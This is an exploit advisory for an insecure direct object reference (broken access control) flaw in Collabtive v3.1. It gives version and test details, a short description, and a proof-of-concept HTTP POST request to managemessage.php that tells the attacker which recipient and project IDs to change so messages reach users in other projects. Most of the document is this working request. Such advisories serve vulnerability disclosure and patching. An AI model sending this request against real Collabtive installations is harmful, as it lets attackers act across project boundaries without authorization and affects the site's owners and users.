# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add message for every user even he is not in the same project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /managemessage.php?action=add&id=1(ATTACK'S PROJECT ID) HTTP/1.1
...

&privateRecipient=3(CHANGE HERE)&title=for%20user22222&=&=&=&=&=&=&=&=&=&=&=&=&text=qqquser2&milestone=0&sendto[]=3(ATTACK'S PROJECT ID)&=&=
```